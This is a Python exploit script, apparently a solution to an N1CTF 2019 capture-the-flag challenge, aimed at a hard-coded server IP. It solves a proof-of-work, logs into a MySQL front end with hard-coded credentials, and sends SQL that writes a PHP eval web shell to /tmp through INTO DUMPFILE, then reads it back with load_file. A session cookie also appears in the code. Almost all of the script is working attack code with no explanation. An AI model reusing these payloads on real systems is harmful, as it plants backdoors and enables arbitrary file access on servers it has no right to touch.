#!/usr/bin/env python3
# -*- coding:utf-8 -*-
"""
    Author : Virink <virink@outlook.com>
    Date   : 2019/09/06, 22:23
"""

import requests as req
import re
import json


cookies = {
    'PHPSESSID': 'g19hbhjtpk7liem9v0komt002v'
}

URL = 'http://47.91.213.248:8001'


def run_code(code, pos=0, suffix='Nu1L'):
    import commands
    res = commands.getstatusoutput(
        "/usr/local/bin/hashpow -p %d -sf %d -c %s" % (pos, suffix, code))
    if len(res) > 1 and res[0] == 0:
        return res[1]
    return False


def getCode():
    res = req.get(URL+'/getcode', cookies=cookies)
    if res.status_code == 200:
        m = re.findall(r'=== ([a-z0-9]{5})', res.content)
        if m and len(m) > 0:
            return m[0]
    return False


def query(code, sql='select 1;'):
    data = {
        'code': code,
        'query': sql
    }
    res = req.post(URL+'/query', data=data, cookies=cookies)
    if res.status_code == 200 and 'no result' not in res.content:
        return res.content.replace('&lt;', '<').replace('&quot;', '"')
    return False


def login(host='127.0.0.1:3306', user='Smi1e', passwd='N1CTF2019'):
    data = {
        'host': host,
        'username': user,
        'password': passwd
    }
    res = req.post(URL+'/login', data=data, cookies=cookies, timeout=10)
    # if res.status_code == 200:
    if 'Access denied' not in res.content:
        # print("[+] Success : passwd = %s" % passwd)
        print("[+] Success Login")
        return True
    return False


if __name__ == '__main__':
    print("[+] Start...")

    exp = "select '<?php eval($_POST[1]);' into/*" + \
        ('a' * 1000000)+"*/dumpfile '/tmp/vk';-- -"

    # exp = "show tables;"
    # table Nu1L
    # exp = "show columns from Nu1L;"
    # columns name:varchar(10) about:varchar(1000) contact:varchar(40)

    exp = "select load_file('/tmp/vk');"
    # login()
    c = getCode()
    if c:
        print("[+] Get Code : %s" % c)
        c = run_code(c)
        if c:
            print("[+] De Code  : %s" % c)
            res = query(c, exp)
            if res:
                print(
                    "[+] ============================== Result ==============================")
                try:
                    for k in json.loads(res):
                        if len(k) == 1:
                            print("[*] %s" % k[0])
                        else:
                            print("[*] %-50s = %s" % (k[0], k[1]))
                except:
                    print("[-] %s" % res)
